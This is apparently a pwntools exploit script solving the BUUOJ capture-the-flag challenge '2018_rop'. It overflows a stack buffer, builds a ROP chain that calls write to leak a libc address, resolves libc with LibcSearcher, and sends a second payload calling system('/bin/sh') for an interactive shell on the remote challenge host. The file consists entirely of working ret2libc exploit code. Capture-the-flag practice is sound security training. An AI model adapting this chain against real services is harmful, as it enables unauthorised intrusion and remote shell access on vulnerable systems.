from LibcSearcher import LibcSearcher
from pwn import *


def rop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/2018_rop'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 25959)
    target_elf = ELF(file_name)

    write_plt = p32(target_elf.plt['write'])
    write_got = p32(target_elf.got['write'])
    vulnerable_function_addr = p32(target_elf.symbols['vulnerable_function'])

    pop3_ret_gadget = p32(0x0804855d)  # pop esi ; pop edi ; pop ebp ; ret

    payload_1 = b'A' * (0x88 + 0x4)
    # write(1, write_got, 4);
    payload_1 += write_plt + pop3_ret_gadget + p32(1) + write_got + p32(0x10)
    # vulnerable_function()
    payload_1 += vulnerable_function_addr

    target.sendline(payload_1)

    write_addr = u32(target.recv(4))
    print(hex(write_addr))
    searcher = LibcSearcher('write', write_addr)
    libc_base_addr = write_addr - searcher.dump('write')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (0x88 + 0x4)
    # system(/bin/sh)
    payload_2 += system_addr + p32(0xdeadbeef) + bin_sh_addr

    target.sendline(payload_2)

    target.interactive()


if __name__ == '__main__':
    rop()
